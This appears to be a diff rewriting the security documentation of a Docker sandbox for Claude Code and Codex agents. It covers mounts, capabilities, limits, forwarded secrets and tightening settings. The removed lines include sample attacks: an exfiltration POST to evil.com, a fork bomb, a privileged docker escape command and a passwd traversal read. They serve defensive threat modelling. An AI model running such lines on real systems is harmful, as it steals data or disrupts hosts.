@@ -1,556 +1,188 @@
-# Security Architecture - sclaude / scodex
+# Security
 
-Security analysis of the shared Docker sandbox for running Claude Code through
-`sclaude` or Codex through `scodex`.
+What the sandbox isolates, what it lets through on purpose, and the settings
+that narrow it. The sandbox is a container with dropped capabilities and
+resource limits; it is not a VM, and it has network access.
 
-## Threat Model
+## What it protects against
 
-### What We're Protecting Against
+- The agent reading or changing files outside the workspace.
+- The agent reaching the host engine, other containers, or host services
+  through `localhost`.
+- The agent gaining root on the host, or broad root inside the container.
+- Runaway resource use: memory, CPU, processes, file descriptors.
 
-1. **Path Traversal Attacks**: Accessing files outside workspace using `..`, symlinks, or other techniques
-2. **Container Escape**: Breaking out of Docker container to access host system
-3. **Privilege Escalation**: Gaining root or elevated privileges
-4. **Resource Exhaustion**: Consuming unlimited CPU, memory, or processes
-5. **Credential Theft**: Accessing SSH keys, API tokens outside workspace
-6. **Data Exfiltration**: Uploading workspace files to malicious servers
+## What it does not protect against
 
-### What We're NOT Protecting Against
+- A user who deliberately runs harmful tasks.
+- Exfiltration of the workspace and of what is synced in, over the network
+  the agent needs for packages and its API.
+- Unknown container escapes in the kernel or the engine.
+- Malicious packages the agent installs: they run inside the sandbox with
+  the same reach as the agent.
 
-1. **Intentional Malicious Use**: User deliberately creating harmful tasks
-2. **Physical Access**: Someone with physical access to the host
-3. **Zero-day Container Escapes**: Unknown Docker vulnerabilities
-4. **Social Engineering**: Tricking user into accepting malicious changes
+## Isolation
 
-## Security Layers
+### Filesystem
 
-### Layer 1: Filesystem Isolation
+The current directory is bind-mounted read-write at the same path; the
+physical path (symlinks resolved) is the source. `/` is refused as a
+workspace. `~/sagent-drop`, or the folder `SAGENT_DROP_DIR` names, is
+mounted read-write at its own path. Everything else the sandbox sees is a
+named volume or a copy; no other host directory is mounted. `..` cannot
+leave a bind mount.
 
-#### Workspace Mount
+On rootless podman the wrapper adds `--userns=keep-id` so the sandbox user
+is your user on the host side and every other uid, root included, stays in
+your subordinate range. The docker CLI cannot request that mapping, so a
+rootless daemon behind it is refused.
 
-`$(pwd -P)` is mounted at `$(pwd)`:
+Toolchains in the image are owned by root and read-only for the agent,
+except `RUSTUP_HOME`, which rustup's proxies write to. User-level installs
+(`pip --user`, `npm -g`, `cargo install`, `go install`, `uv python install`)
+go to the persistent home volumes.
 
-```bash
--v "$WORKSPACE_HOST_PATH:$WORKSPACE_PATH:rw"
-```
+### User and sudo
 
-**Protection**: Uses the absolute path, mounted at the same location in the
-container; the physical path (symlinks resolved) is the source so VM-backed
-engines can find it, the logical path is the target so session state keyed on
-the directory stays stable. `/` is refused as a workspace.
+Everything runs as `agent`, with your uid and gid so files in the workspace
+keep their owner. `sudo` is limited to `apt-get`, `apt` and `dpkg`, without
+a password, so the agent can install system packages. `no-new-privileges`
+is not set, because that would break `sudo apt`; the trade-off is root
+inside the container for those three commands.
 
-**Prevents**:
-- ✅ `../../../etc/passwd` - Cannot traverse outside mount
-- ✅ `~/sensitive-file` - No host path is reachable beyond the workspace and
-  what is deliberately mounted or synced in (sessions, clipboard spool, the
-  credentials and git/gh/ssh state listed under "Host secrets passed through")
-- ✅ Moving files outside workspace - Mount boundary enforced by kernel
+### Capabilities
 
-**How It Works**:
-- Docker bind mounts create isolated filesystem namespace
-- Kernel enforces boundaries at mount point
-- No amount of `..` traversal can escape
-- On rootless podman the wrapper adds `--userns=keep-id:uid=<host>,gid=<host>`
-  so the sandbox user is your user on the host side (the container's root and
-  every other UID stay in your subordinate-UID range); the docker CLI cannot
-  request that mapping, so a rootless daemon behind it is refused
+All capabilities are dropped, then the set `apt` needs is added back:
+`CHOWN`, `DAC_OVERRIDE`, `FOWNER`, `FSETID`, `SETGID`, `SETUID`,
+`SYS_CHROOT`, and `NET_BIND_SERVICE` for low ports. `SYS_ADMIN`,
+`SYS_PTRACE`, `NET_ADMIN`, `SYS_MODULE` and `MKNOD` are not granted.
 
-#### Docker Volumes for Persistence
-```bash
--v sclaude-config:/sclaude-config:rw \
--v scodex-config:/scodex-config:rw \
--v sagent-rootfs:/home/agent:rw \
--v sagent-npm:/home/agent/.npm-global:rw \
--v sagent-pip:/home/agent/.local:rw \
--v sagent-share:/home/agent/.local/share:rw \
--v sagent-apt-cache:/var/cache/apt:rw \
--v sagent-apt-lists:/var/lib/apt/lists:rw \
--v sagent-containers:/home/agent/.local/share/containers:rw
-```
+The container runs with `--security-opt label=disable`: on SELinux hosts
+the workspace mount would otherwise be unreadable without relabelling your
+files. SELinux confinement is not part of this sandbox's model; the flag is
+a no-op elsewhere.
 
-**Protection**:
-- Isolated from host filesystem
-- Stored in Docker-managed storage
-- Cannot access host directories
+### Resource limits
 
-**Benefits**:
-- ✅ Credentials persist across runs
-- ✅ Package caches persist
-- ✅ No conflicts with host files
-- ✅ Clean separation of concerns
+`--memory 4g`, `--cpus 2`, `--pids-limit 100` (512 with container
+tooling), `--ulimit nofile=8192`. `MEMORY_LIMIT`, `CPU_LIMIT` and
+`PIDS_LIMIT` change them.
 
-#### Toolchains in the image
+### Network
 
-Node, Python (via uv), Go, Rust and Java are installed system-wide and
-read-only for the agent, except `RUSTUP_HOME` (`/opt/rust/rustup`), which is
-world-writable because the rustup proxies write there; the agent can alter
-the Rust toolchain inside its own sandbox, which is no more than `sudo apt`
-already allows. User-level installs (`pip --user`, `npm -g`, `cargo install`,
-`go install`, `uv python install`) go to the persistent home volumes.
+`--network bridge`: an isolated network namespace with outbound access.
+The container's `localhost` is not the host's. Host services may still be
+reachable through the engine's gateway address or Docker Desktop's host
+aliases.
 
-### Layer 2: User Privileges
+### Engine socket
 
-#### Non-Root User
-```dockerfile
-ARG USER_UID=1000
-ARG USER_GID=1000
-RUN ... useradd -o -u ${USER_UID} ... agent
+The engine socket is never mounted. Nothing the agent does with `docker` or
+`podman` reaches the host daemon.
 
-USER agent
-```
+### Nested containers
 
-**Protection**:
-- All processes run as non-root
-- UID/GID matches host user (for file permissions)
+Container tooling inside the sandbox is on by default and runs through a
+rootless podman inside the container, with images in the
+`sagent-containers` volume. Capabilities stay dropped; the single-uid
+mapping means the privileged `newuidmap` path is never used.
 
-**Prevents**:
-- ✅ Modifying system configuration
-- ✅ Accessing privileged operations
-- ✅ Installing system-level packages without the allowlisted sudo path
+What the mode relaxes: the default seccomp profile is off (nested mount
+and user-namespace syscalls are otherwise blocked), the AppArmor profile is
+off on hosts that enforce one, `/dev/fuse` and `/dev/net/tun` are passed
+in, and the PID limit is 512. That is more kernel surface than a hardened
+run. `SAGENT_DOCKER=0` or `--no-docker` runs with the default profiles and
+no extra devices. Nested containers share the sandbox's PID namespace and
+use single-uid storage, so images that rely on multi-user file ownership
+may behave differently.
 
-#### Sudo Configuration
-```dockerfile
-RUN echo 'agent ALL=(root) NOPASSWD: /usr/bin/apt-get, /usr/bin/apt, /usr/bin/dpkg' > /etc/sudoers.d/agent
-```
+### Ephemeral container
 
-**Limited Sudo**:
-- Only for apt/dpkg commands
-- No password required (for convenience)
-- Package installs are supported for agent workflows
+The container is removed on exit. Only the volumes and the workspace
+persist.
 
-**Rationale**:
-- Allows agent CLIs to install system dependencies while working
-- Package manager cache/list directories persist in Docker volumes
-- Root is inside the container only; host isolation still depends on Docker
+### `sclaude shell`
 
-### Layer 3: Capability Limiting
+`shell` runs bash with exactly the tool container's mounts, capabilities
+and limits, or attaches to the sandbox already running for the workspace.
+It is the same sandbox, not a side door.
 
-```bash
---cap-drop=ALL \
---cap-add=CHOWN \
---cap-add=DAC_OVERRIDE \
---cap-add=FOWNER \
---cap-add=FSETID \
---cap-add=SETGID \
---cap-add=SETUID \
---cap-add=SYS_CHROOT \
---cap-add=NET_BIND_SERVICE
-```
+## What is let through on purpose
 
-**Protection**:
-- Starts with no Linux capabilities
-- Adds back only the set needed for allowlisted `sudo apt` package installs and
-  low-port binding
+Each item here is a choice, and each has a setting that turns it off.
+[Host state in the sandbox](host-state.md) describes the mechanics.
 
-**Prevents**:
-- ✅ `CAP_SYS_ADMIN` - Not granted; privileged mounts and admin operations are
-  unavailable. Note: with container tooling on (the default), unprivileged user
-  namespaces plus the relaxed seccomp filter still allow the mounts nested
-  podman needs inside its own namespaces — see the Nested Containers section.
-- ✅ `CAP_SYS_PTRACE` - Cannot debug other processes
-- ✅ `CAP_NET_ADMIN` - Cannot modify network configuration
-- ✅ `CAP_SYS_MODULE` - Cannot load kernel modules
-- ✅ `CAP_MKNOD` - Cannot create device files
+### Secrets
 
-**Result**: Root inside the container can manage packages, but broad
-container-control capabilities remain unavailable.
+Forwarded when set in your environment: `ANTHROPIC_API_KEY`,
+`ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_BASE_URL`, `ANTHROPIC_MODEL`,
+`CLAUDE_CODE_OAUTH_TOKEN` and `GH_TOKEN` (sclaude); `OPENAI_API_KEY`,
+`CODEX_API_KEY`, `OPENAI_BASE_URL`, `OPENAI_ORGANIZATION`, `OPENAI_PROJECT`,
+`CODEX_ACCESS_TOKEN` and `GH_TOKEN` (scodex); and terminal identity
+variables.
 
-### Layer 4: Controlled In-Container Root
-
-The runtime intentionally does not use `no-new-privileges`, because that would
-break `sudo apt`. The tradeoff is explicit: agent CLIs can become root inside the
-container for allowlisted package-management commands.
-
-The tool container also runs with `--security-opt label=disable`: on
-SELinux-enforcing hosts (Fedora/RHEL + podman) the workspace bind mount would
-otherwise be unreadable without relabeling the user's files. SELinux label
-confinement is not part of this sandbox's isolation model (it does not exist on
-macOS/Docker Desktop at all); isolation relies on namespaces, capability
-dropping, and resource limits. The flag is a no-op for Docker and non-SELinux
-hosts.
-
-**Protection still provided**:
-- Docker socket is not mounted
-- Host filesystem access is limited to the workspace bind mount and the drop folder (`~/sagent-drop`, or what `SAGENT_DROP_DIR` names)
-- Resource limits still apply
-- The capability set is restricted
-
-### Layer 5: Resource Limits
-
-```bash
---memory="4g" \
---cpus="2" \
---pids-limit="100" \
---ulimit nofile=8192:8192
-```
-
-**Memory Limit (4GB)**:
-- Prevents memory exhaustion attacks
-- OOM killer terminates processes at limit
-- Host system unaffected
-
-**CPU Limit (2 cores)**:
-- Prevents CPU exhaustion (bitcoin mining, etc.)
-- Throttles to 2 CPUs max
-- Host remains responsive
-
-**Process Limit (100; 512 with container tooling)**:
-- Prevents fork bombs
-- fork() fails at limit
-- System remains stable
-
-**File Descriptor Limit (8192)**:
-- Prevents FD exhaustion
-- Limits open files
-
-### Layer 6: Network Isolation
-
-```bash
---network bridge
-```
-
-**Protection**:
-- Isolated network namespace
-- Cannot use container `localhost` to access host loopback services
-
-**Prevents**:
-- ✅ Sniffing host traffic
-- ✅ Layer 2 attacks (ARP spoofing)
-
-**Allows**:
-- ✅ Internet access (for package downloads)
-- ✅ Outbound connections
-- ⚠️ Host services may still be reachable through Docker gateway addresses or
-  Docker Desktop host aliases depending on platform
-
-**Limitation**:
-- ⚠️ Can exfiltrate workspace data (inherent tradeoff for package management)
-
-#### Host secrets passed through on purpose
-
-Forwarded when set: `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`,
-`ANTHROPIC_BASE_URL`, `ANTHROPIC_MODEL`, `CLAUDE_CODE_OAUTH_TOKEN`, `GH_TOKEN`
-(sclaude); `OPENAI_API_KEY`, `CODEX_API_KEY`, `OPENAI_BASE_URL`,
-`OPENAI_ORGANIZATION`, `OPENAI_PROJECT`, `CODEX_ACCESS_TOKEN`, `GH_TOKEN`
-(scodex); terminal identity (`TERM_PROGRAM` and the like).
-
-Synced in: Claude and Codex credentials, your `gh` login, your global git
-config. With `SAGENT_GIT_PROTOCOL=ssh` (default when your gh uses ssh) also
-`~/.ssh`, private keys included; they open every host they open on your
-machine, not only GitHub. Whatever the agent can read it can send out. To
-limit that: `SAGENT_GIT_PROTOCOL=https` keeps keys out; log `gh` out on the
-host or use a fine-grained token.
+Synced in: your Claude and Codex sign-in, your `gh` login, your global git
+config. With `SAGENT_GIT_PROTOCOL=ssh`, the default when your gh uses ssh,
+also `~/.ssh` with your private keys, which open every host they open on
+your machine. Whatever the agent can read it can send out.
+`SAGENT_GIT_PROTOCOL=https` keeps the keys out; logging `gh` out on the
+host, or using a fine-grained token, limits what the token can do.
 
 Host paths do not exist in the sandbox, so `SSL_CERT_FILE` and similar are
 not forwarded; use `SAGENT_CA_BUNDLE`.
 
-#### Session transcripts
+### Session transcripts
 
-The host directory holding this workspace's sessions is bind-mounted into
-the sandbox (`~/.claude/projects/<workspace>`; for Codex the whole
-`~/.codex/sessions` tree, which it does not split per project), so either
-side can resume the other's work. The agent can read and write those
-transcripts: past conversations for this workspace, and with Codex for every
-workspace. That is the same class of content the agent already produces, but
-it is history it could otherwise not reach. `SAGENT_SESSIONS=0` leaves it
-out; sessions started inside the sandbox then stay in its own volume. Since
-the config file is sourced, `[ "$SCRIPT_NAME" = scodex ] && SAGENT_SESSIONS=0`
-drops Codex's whole-history sharing while keeping Claude's, which is per
-workspace.
+This workspace's Claude Code transcripts, and Codex's whole session tree,
+are bind-mounted from the host so either side can resume the other's work.
+The agent can read and write them. `SAGENT_SESSIONS=0` keeps them out.
+`SAGENT_SESSIONS=all` also shares `~/.claude/file-history`, which holds
+file contents from every workspace. The rest of what the tools keep on the
+host stays there: shell snapshots and session environments describe the
+host, `history.jsonl` is appended by both sides, and the paste cache and
+plans are not per project.
 
-Transcripts are all a resume needs. The rest of what the tool keeps beside
-them stays on the host: `shell-snapshots` and `session-env` describe the host
-environment and would be wrong inside, `history.jsonl` is appended by both
-sides at once, and `paste-cache` and `plans` are not per project.
-`SAGENT_SESSIONS=all` shares one more — `file-history`, the snapshots
-`/rewind` restores — accepting that it holds file contents from every
-workspace, not just this one.
+### Clipboard
 
-#### Clipboard bridge
+A per-run spool directory (`~/.cache/sagent/clipboard.*`, mode 700, removed
+afterwards) is mounted at `/run/sagent/clipboard`. The sandbox's clipboard
+commands drop request files there and an agent on the host answers with
+`pbcopy`, `pbpaste` and `osascript`, or `wl-copy`, `wl-paste` and `xclip`.
+Request data is clipboard content, text or a PNG, never a command. A
+headless X display inside the sandbox (unix socket only) serves the same
+clipboard to programs that read it over X11, and forwards what they copy.
 
-The wrapper runs a clipboard agent on the host per run and mounts a
-per-run directory (`~/.cache/sagent/clipboard.*`, mode 700, removed
-afterwards) at `/run/sagent/clipboard`. The sandbox's clipboard commands
-drop request files there; the agent answers with the host's `pbcopy`,
-`pbpaste` and `osascript` (or `wl-copy`/`wl-paste`/`xclip`). Request data is
-only ever clipboard content, text or a PNG, never a command.
+The agent can read your clipboard at any time and set it to anything.
+`SAGENT_CLIPBOARD=0` turns the bridge off.
 
-Programs that read the clipboard over X11 rather than by running `xclip`
-(Codex does, for images) see the same clipboard: `sagent-run` starts a
-headless `Xvfb` on `DISPLAY=:99` (unix socket only, no TCP) and a small
-daemon that owns the X selection and answers from the bridge. What another
-X client puts on the selection is forwarded to the host the same way.
+### The drop folder
 
-This means the agent can read your clipboard at any time (a password you
-just copied) and set it to anything. `SAGENT_CLIPBOARD=0` turns the bridge
-off; copies then go out as OSC 52 through the terminal and reads fail.
+`~/sagent-drop` is read-write for the agent. Keep it for files you mean to
+hand over. `SAGENT_DROP_DIR` points it elsewhere.
 
-#### Extra trust anchors (`SAGENT_CA_BUNDLE`)
+### Extra trust anchors
 
-Certificates from `SAGENT_CA_BUNDLE` are added to the image's system trust
-store and exported to Node (`NODE_EXTRA_CA_CERTS`), OpenSSL/Codex
-(`SSL_CERT_FILE`), requests and pip. Whoever controls that CA can read every
-HTTPS exchange the sandbox makes, including API traffic and credentials in
-flight. That is already true of the host on such a network; the wrapper only
-extends the same trust to the sandbox, and only for the file you name.
-
-### Nested Containers (`--docker` mode, on by default)
-
-Container tooling inside the sandbox is enabled by default via nested rootless
-podman (with a docker CLI shim). Disable it per run with `--no-docker` or
-persistently with `SAGENT_DOCKER=0` in the environment or the config file.
-Design choices, safest first:
-
-- **The host engine socket is never mounted** — nested containers run under a
-  podman instance inside the sandbox, storing images in the
-  `sagent-containers` volume. Nothing the agent does with `docker`/`podman`
-  can reach the host daemon.
-- **Capabilities stay dropped** (same set as normal runs). Single-uid rootless
-  mapping means the privileged `newuidmap` path is never used, so
-  `CAP_SYS_ADMIN` is NOT granted.
-- **What the mode relaxes**: the default seccomp profile is disabled
-  (`seccomp=unconfined` — nested mount/user-namespace syscalls are otherwise
-  blocked), the AppArmor profile is disabled on hosts that enforce one
-  (Ubuntu/Debian docker denies mounts inside user namespaces regardless of
-  seccomp), `/dev/fuse` and `/dev/net/tun` are passed in, and the PID limit is
-  raised to 512. This widens kernel attack surface relative to a hardened run —
-  a kernel exploit has more syscalls to aim at. Set `SAGENT_DOCKER=0` (or pass
-  `--no-docker`) to run with the default seccomp profile and no extra devices
-  when container tooling is not needed.
-- Nested containers share the sandbox's PID namespace (they can see the
-  sandbox's own processes — all agent-owned) and use single-uid storage
-  (`ignore_chown_errors`), so images relying on multi-user file ownership
-  semantics may behave differently.
-
-### Layer 7: Docker Socket NOT Mounted
-
-**Critical**: the engine socket (`/var/run/docker.sock`) is never mounted.
-
-**Why This Matters**:
-- Docker socket = root-equivalent host access
-- Could create privileged container and escape
-- Major container escape vector
-
-**Our Approach**:
-- ✅ Socket NOT mounted
-- ✅ Cannot interact with the host engine daemon
-- ✅ Cannot create/modify host containers (nested containers run under the
-  sandbox's own rootless podman, see the Nested Containers section)
-
-### Shell access
-
-`sclaude shell` runs bash with exactly the tool container's mounts, volumes,
-capabilities and limits (or attaches to the sandbox already running for the
-workspace with `exec`, which inherits that container's confinement). It is
-the same sandbox, not a privileged side door.
-
-### Layer 8: Ephemeral Container
-
-```bash
---rm
-```
-
-**Protection**:
-- Container deleted on exit
-- Filesystem changes discarded (except volumes)
-- Clean slate on each run
-
-**Benefits**:
-- ✅ Malware doesn't persist in system
-- ✅ apt packages reset each run
-- ✅ Cannot build up cruft over time
-
-**What Persists** (by design):
-- Docker volumes (credentials, tool config, caches)
-- Workspace files (the point of the tool)
-
-## Attack Scenarios & Mitigations
-
-### Scenario 1: Path Traversal via `..`
-
-**Attack**:
-```python
-with open('../../../etc/passwd', 'r') as f:
-    data = f.read()
-```
-
-**Mitigation**:
-- ✅ **BLOCKED**: Mount boundary enforced by kernel
-- `..` stays within workspace
-- Even symlinks cannot break out
-
-### Scenario 2: Container Escape via Docker Socket
-
-**Attack**:
-```bash
-docker run -v /:/host --privileged alpine chroot /host
-```
-
-**Mitigation**:
-- ✅ **BLOCKED**: Socket not mounted
-- Cannot access Docker daemon
-- Cannot create containers
-
-### Scenario 3: Container Root via Sudo
-
-**Attack**:
-```bash
-sudo apt-get install some-package
-```
-
-**Mitigation**:
-- ⚠️ **ALLOWED FOR PACKAGE MANAGEMENT**: `apt`, `apt-get`, and `dpkg` are
-  allowlisted because agent CLIs may need system dependencies.
-- Docker socket remains unavailable.
-- Host filesystem access remains limited to the mounted workspace.
-- Capabilities remain limited to the package-management set.
-
-### Scenario 4: Fork Bomb
-
-**Attack**:
-```bash
-:(){ :|:& };:
-```
-
-**Mitigation**:
-- ✅ **BLOCKED**: --pids-limit=100
-- fork() fails at limit
-- System remains responsive
-
-### Scenario 5: Memory Exhaustion
-
-**Attack**:
-```python
-data = []
-while True:
-    data.append([0] * 1000000)
-```
-
-**Mitigation**:
-- ✅ **BLOCKED**: --memory=4g
-- OOM killer terminates at limit
-- Host unaffected
-
-### Scenario 6: Data Exfiltration
-
-**Attack**:
-```python
-import requests
-requests.post('https://evil.com', files={'data': open('secret.txt')})
-```
-
-**Mitigation**:
-- ⚠️ **PARTIALLY MITIGATED**:
-  - Can exfiltrate workspace files (inherent tradeoff)
-  - Can exfiltrate what is synced in: the Claude/Codex credentials, the gh
-    token, and — with `SAGENT_GIT_PROTOCOL=ssh`, the default when your gh
-    uses ssh — your SSH private keys. `SAGENT_GIT_PROTOCOL=https` keeps the
-    keys out; nothing else on the host is reachable
-  - Network access needed for package management
-
-**Best Practices**:
-- Don't put secrets in workspace
-- Review changes via git diff
-- Use git to track all modifications
-
-### Scenario 7: Malicious Package
-
-**Attack**:
-```bash
-pip install evil-package
-```
-
-**Mitigation**:
-- ⚠️ **PARTIALLY MITIGATED**:
-  - Runs as non-root
-  - Container is ephemeral
-  - No host files beyond the workspace and what is synced in
-  - Limited by capabilities
-
-**Blast Radius**:
-- Can affect the workspace and the persistent volumes (installed packages,
-  the sandbox home)
-- Cannot persist to the host system
-- Reaches synced secrets: see Scenario 6
-
-## Known Limitations
-
-### 1. Network Access
-
-**Issue**: Full internet access
-
-**Impact**:
-- Needed for package downloads
-- Can exfiltrate workspace data
-
-**Mitigations**:
-- Don't put secrets in workspace
-- Review git diff before committing
-- Monitor for suspicious activity
-
-### 2. Workspace Access
-
-**Issue**: Full read-write to workspace
-
-**Impact**:
-- Can delete/modify all files
-- Can commit bad code
-
-**Mitigations**:
-- Use git (commit before running)
-- Review changes (git diff)
-- Can revert (git reset --hard)
-
-### 3. Dependency Trust
-
-**Issue**: Can install any packages
-
-**Impact**:
-- Supply chain attacks possible
-
-**Mitigations**:
-- Isolated in container
-- Package cache/list state can persist in Docker volumes
-- Review installed packages
-
-## Security Checklist
-
-**Before running**:
-- [ ] Git commit - Save current state
-- [ ] No secrets in workspace
-- [ ] Claude or Codex auth available if needed
-
-**After running**:
-- [ ] Review changes - `git diff`
-- [ ] Test functionality
-- [ ] Audit dependencies
-- [ ] Commit or revert
+Certificates in `SAGENT_CA_BUNDLE` go into the image's trust store and are
+exported to Node, OpenSSL, requests and pip. Whoever controls that CA can
+read the sandbox's HTTPS traffic, credentials in flight included. That is
+already true of the host on such a network.
 
 ## What you can tighten
 
-Every knob is a setting in `~/.config/sagent/config` (or the environment):
-
 | Setting | Effect |
 |---|---|
-| `SAGENT_DOCKER=0` | No nested containers: the default seccomp profile and AppArmor stay on, no `/dev/fuse` or `/dev/net/tun`, PID limit 100 |
-| `SAGENT_GIT_PROTOCOL=https` | No SSH keys enter the sandbox; git uses the gh token over HTTPS |
-| `SAGENT_SESSIONS=0` | No transcripts shared; a session started inside stays inside |
-| `SAGENT_CLIPBOARD=0` | The sandbox cannot read the host clipboard |
-| `MEMORY_LIMIT`, `CPU_LIMIT`, `PIDS_LIMIT` | Smaller than the 4g / 2 / 100 defaults |
+| `SAGENT_DOCKER=0` | No nested containers: default seccomp and AppArmor, no `/dev/fuse` or `/dev/net/tun`, PID limit 100 |
+| `SAGENT_GIT_PROTOCOL=https` | No SSH keys enter the sandbox |
+| `SAGENT_SESSIONS=0` | No transcripts shared |
+| `SAGENT_CLIPBOARD=0` | The sandbox cannot read or set the host clipboard |
+| `MEMORY_LIMIT`, `CPU_LIMIT`, `PIDS_LIMIT` | Lower than 4g, 2 and 100 |
 
-Not available: a run without network, a read-only workspace, or another
-runtime (gVisor). The wrapper builds the `docker run` command itself and has
-no pass-through for extra flags; log `gh` out on the host if the token should
-not travel either.
+Not available: a run without network, a read-only workspace, another
+runtime such as gVisor, or extra `docker run` flags. Log `gh` out on the
+host if the token should not travel.
 
-## Scope
+## Working safely
 
-**Best Used For**:
-- Development tasks with version control
-- Automated testing and refactoring
-- Code generation and bug fixing
-- Projects without sensitive credentials
-
-**Not Suitable For**:
-- Processing untrusted codebases
-- Handling sensitive credentials
-- Unattended operation without monitoring
+Commit before a run and review with `git diff` afterwards. Keep secrets out
+of the workspace. Do not point the sandbox at a codebase you do not trust:
+the code it contains runs with the agent's reach.
